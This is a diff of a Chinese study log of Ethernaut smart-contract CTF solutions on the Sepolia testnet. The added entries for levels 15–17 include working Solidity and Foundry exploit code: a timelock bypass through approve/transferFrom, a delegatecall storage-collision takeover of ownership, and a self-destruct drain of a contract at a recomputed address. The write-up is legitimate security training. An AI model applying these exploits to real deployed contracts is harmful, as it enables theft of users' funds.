@@ -14,7 +14,8 @@ timezone: Asia/Shanghai
 <!-- Content_START -->
 
 ### 2024.08.29
-The Ethernaut level 0
+[The Ethernaut level 0](https://ethernaut.openzeppelin.com/level/0)
+
 第一天打卡，内容比较简单，在控制台输入代码即可交互
 ![截屏2024-08-29 22 51 18](https://github.com/user-attachments/assets/bbf8c784-6562-46e2-9d66-4962a968b368)
 
@@ -26,7 +27,7 @@ The Ethernaut level 1- 获取合约拥有权，并提取余额
 
 
 ### 2024.08.31
-The Ethernaut level 1
+[The Ethernaut level 1](https://ethernaut.openzeppelin.com/level/1)
 
 调试了好久，终于成功了。
 
@@ -42,7 +43,7 @@ The Ethernaut level 1
 
 
 ### 2024.09.01
-The Ethernaut level 2  
+[The Ethernaut level 2](https://ethernaut.openzeppelin.com/level/2)
 
 这道题的构造函数是 `Fal1out`，合约名叫 `Fallout`。不仔细检查，完全看不出来区别。
 
@@ -74,7 +75,7 @@ cast send \
 
 
 ### 2024.09.02
-The Ethernaut level 3
+[The Ethernaut level 3](https://ethernaut.openzeppelin.com/level/3)
 
 这个挑战要求在一次投币游戏中通过猜测投币的结果连续正确10次。
 
@@ -96,7 +97,7 @@ The Ethernaut level 3
 
 
 ### 2024.09.03
-The Ethernaut level 4
+[The Ethernaut level 4](https://ethernaut.openzeppelin.com/level/4)
 
 Ethernaut的第4关要求获得合约的owner权限。
 
@@ -116,7 +117,7 @@ Ethernaut的第4关要求获得合约的owner权限。
 
 
 ### 2024.09.04
-[The Ethernaut level 5](https://ethernaut.openzeppelin.com/level/0x478f3476358Eb166Cb7adE4666d04fbdDB56C407)
+[The Ethernaut level 5](https://ethernaut.openzeppelin.com/level/5)
 
 这一关要求获得更多的token。
 
@@ -149,7 +150,7 @@ cast send <level address> \
 
 ### 2024.09.05
 
-[The Ethernaut level 6](https://ethernaut.openzeppelin.com/level/0x73379d8B82Fda494ee59555f333DF7D44483fD58)
+[The Ethernaut level 6](https://ethernaut.openzeppelin.com/level/6)
 
 这一关要求获得 `Delegation` 合约的 `owner` 权限
 
@@ -191,7 +192,7 @@ cast call <level address> \
 - 获取权限的交易的哈希: [0xa74c34ac10570535f2faa6b86677a3a2c5799783fac5bfe874c3cbbf9d27c3b2](https://sepolia.etherscan.io/tx/0xa74c34ac10570535f2faa6b86677a3a2c5799783fac5bfe874c3cbbf9d27c3b2)
 
 
-[The Ethernaut level 7](https://ethernaut.openzeppelin.com/level/0xb6c2Ec883DaAac76D8922519E63f875c2ec65575)
+[The Ethernaut level 7](https://ethernaut.openzeppelin.com/level/7)
 
 这一关的要求是增加 `Forece` 合约的 ether 余额
 
@@ -236,7 +237,7 @@ cast balance 0xd2E4Ba00684F3d61D585ca344ec566e03FA06F47 --rpc-url sepolia
 
 ### 2024.09.06
 
-[The Ethernaut level 8](https://ethernaut.openzeppelin.com/level/0xB7257D8Ba61BD1b3Fb7249DCd9330a023a5F3670)
+[The Ethernaut level 8](https://ethernaut.openzeppelin.com/level/8)
 
 这一关的要求是反转 `Vault` 的 `locked` 状态
 
@@ -368,7 +369,7 @@ cast send <level address> \
 
 ### 2024.09.08
 
-[The Ethernaut level 10](https://ethernaut.openzeppelin.com/level/0x2a24869323C0B13Dff24E196Ba072dC790D52479)
+[The Ethernaut level 10](https://ethernaut.openzeppelin.com/level/10)
 
 这一关的要求是获取合约里所有的资金。
 
@@ -443,7 +444,7 @@ cast balance <address> --rpc-url sepolia
 
 ### 2024.09.09
 
-[The Ethernaut level 11](https://ethernaut.openzeppelin.com/level/0x6DcE47e94Fa22F8E2d8A7FDf538602B1F86aBFd2)
+[The Ethernaut level 11](https://ethernaut.openzeppelin.com/level/11)
 
 这一关的要求是让电梯合约达到顶楼。
 
@@ -516,7 +517,7 @@ cast call 0x5B0424701F6f9a8e27CF76DAfC918A5E558f0Dc5 \
 
 ### 2024.09.10
 
-[The Ethernaut level 12](https://ethernaut.openzeppelin.com/level/0x131c3249e115491E83De375171767Af07906eA36)
+[The Ethernaut level 12](https://ethernaut.openzeppelin.com/level/12)
 
 这一关的要求是解锁 `Privacy` 合约。
 
@@ -592,7 +593,7 @@ cast call 0x477C9b8Afa15DcF950fbAeEd391170C0eb0534C3 \
 
 ### 2024.09.11
 
-[The Ethernaut level 13](https://ethernaut.openzeppelin.com/level/0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C)
+[The Ethernaut level 13](https://ethernaut.openzeppelin.com/level/13)
 
 这一关的要求是通过三个守门员。
 - gateOne：msg.sender 和 tx.origin 不想等，这个很容易实现：通过部署一个中间合约去调用。
@@ -602,5 +603,134 @@ cast call 0x477C9b8Afa15DcF950fbAeEd391170C0eb0534C3 \
 ps：脚本还在测试中
 
 
+### 2024.09.12
 
+[The Ethernaut level 15](https://ethernaut.openzeppelin.com/level/15)
+
+这一关的要求是绕过时间限制提取所有代币
+
+仔细阅读合约发现，该合约实现了 ERC20 标准，并尝试防止初始代币持有者在给定的时间锁（`timeLock`）之前转移代币。合约在 `transfer` 函数添加了 `lockTokens` 修饰器，通过 `msg.sender == player` 限制了初始代币持有者提取时间。
+但是，ERC20 合约不只一个转账函数。通过 `arrprove` 和 `transferFrom`，可以授权他人动用自己的币。
+因此，只要初始代币持有者委托给第三者进行转账即可提取所有代币。
+
+攻击脚本：
+```
+...
+address player = vm.addr(privateKey);
+address spender = vm.addr(privateKeySpender);
+
+address levelAddr = 0x69f52ffB405AB5DaaEbDb1111C4F5ec64DaF37C8;
+NaughtCoin level = NaughtCoin(levelAddr);
+
+// 初始化 player
+vm.startBroadcast(privateKey);
+level.approve(spender, level.balanceOf(player));
+vm.stopBroadcast();
+
+// 初始化 spender
+vm.startBroadcast(privateKeySpender);
+level.transferFrom(player, spender, level.balanceOf(player));
+vm.stopBroadcast();
+```
+
+完整代码见：[这里](Writeup/phipupt/ethernaut/script/Level15.s.sol)
+
+链上记录：
+- [level(`NaughtCoin`)](https://sepolia.etherscan.io/address/0x69f52ffB405AB5DaaEbDb1111C4F5ec64DaF37C8)
+- [attack 交易](https://sepolia.etherscan.io/tx/0xe922107016ca833a231a94b896fcc14a80722afe1baf6501de83c27052f768f6)
+
+
+### 2024.09.13
+
+[The Ethernaut level 16](https://ethernaut.openzeppelin.com/level/16)
+
+这一关的目的是解锁获取 Preservation 合约的所有权。
+
+仔细阅读这个合约，发现 `Preservation` 使用了 `delegatecall`。这就很容易发生存储冲突的问题。果不其然，`LibraryContract` 的 `setTime` 函数修改 `storedTime` 变量。该变量在 `LibraryContract` 合约是在 `slot0`。但是由于是 `delegatecall`，真正被修改的是 调用者，即 Preservation 合约的 `slot0`。·
+
+要想成为 owner，可以利用这个漏洞，调用 `setFirstTime` 时 把 `timeZone1Library` 改为攻击者合约。再次调用 `setFirstTime` 时，使用的是攻击者合约的逻辑。可以在攻击者合约部署和 `Preservation` 一样的存储，进而修改 `owner`
+
+攻击者合约：
+```
+contract Attacker {
+    address public timeZone1Library;
+    address public timeZone2Library;
+    address public owner;
+
+    function setTime(uint256 time) public {
+        owner = address(uint160(time));
+    }
+}
+```
+
+攻击脚本：
+```
+...
+address levelAddr = 0x20FD051bF1d72a491674d9259dc7a155160bdF9d;
+Preservation level = Preservation(levelAddr);
+
+Attacker attacker = new Attacker();
+
+// 第一次调用把 timeZone1Library1 改为攻击者地址
+level.setFirstTime(uint256(uint160(address(attacker))));
+
+// 第二次调用其实是 delegatecall attacker 的 setTime 函数把 owner 设置为 sender
+level.setFirstTime(uint256(uint160(address(sender))));
+```
+
+完整代码见：[这里](Writeup/phipupt/ethernaut/script/Level16.s.sol)
+
+
+执行脚本：
+```
+forge script script/Level16.s.sol:CallContractScript --rpc-url sepolia --broadcast
+```
+
+链上记录：
+- [level(`Preservation`)](https://sepolia.etherscan.io/address/0x20FD051bF1d72a491674d9259dc7a155160bdF9d)
+- [Attacker](https://sepolia.etherscan.io/tx/0x937C8d10E36DdaD95C6F9765807A9fd5266e8C7e)
+- [attack 交易](https://sepolia.etherscan.io/tx/0x800f92f8f9b6be1f3119f7ce3708616482e02bf97ecab5e28b14fd7a5470c34f)
+
+### 2024.09.14
+
+[The Ethernaut level 17](https://ethernaut.openzeppelin.com/level/17)
+
+这一关的目的是取回第一个 `SimpleToken` 合约里的 ether，该合约提供了自毁方式可以提取属于资金。然而，该合约地址忘记了。
+（吐槽下，合约地址忘记了的话查看区块链浏览器就可以找回了呀）
+
+仔细阅读合约，`SimpleToken` 合约由 ` Recovery` 合约使用 `create` 操作码创建。要找回创建的合约地址的话，只需 `create` 中的两个关键参数：`sender` 和 `nonce`。前面提到了，是要找回第一个合约的地址，即第一笔交易，因此 `nonce = 1`。`sender` 自然是 `Recovery` 合约的地址。有了这两个关键参数后，合约地址就可以计算出来了。
+
+攻击者合约：
+```
+contract Attacker {
+    Recovery level;
+
+    constructor(address level_) {
+        level = Recovery(level_);
+    }
+
+    function attack() public {
+        address payable lostContract = payable(address(
+            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(level), bytes1(0x01)))))
+        ));
+
+        SimpleToken(lostContract).destroy(payable(msg.sender));
+    }
+}
+```
+
+执行脚本：
+```
+forge script script/level17.s.sol:CallContractScript --rpc-url sepolia --broadcast
+```
+
+完整代码见：[这里](Writeup/phipupt/ethernaut/src/Level17.sol)
+
+
+
+链上记录：
+- [level(`Recovery`)](https://sepolia.etherscan.io/address/0x5B78B2E2ccFD96d2a064A7c20f6eEFcDff851106)
+- [Attacker](https://sepolia.etherscan.io/tx/0x662A79D0A3ecb09F7a92dC47707105591025A030)
+- [attack 交易](https://sepolia.etherscan.io/tx/0x773ac711a60b45f253732a35011d117d88cfc5b68c042575ccf6aa93f6d9fdce)
+- [找回的 SimpleToken 地址](https://sepolia.etherscan.io/address/0x9f7F48EEaF91fDc3Dd94Bfd9d601b54f9e08dB94)
 <!-- Content_END -->
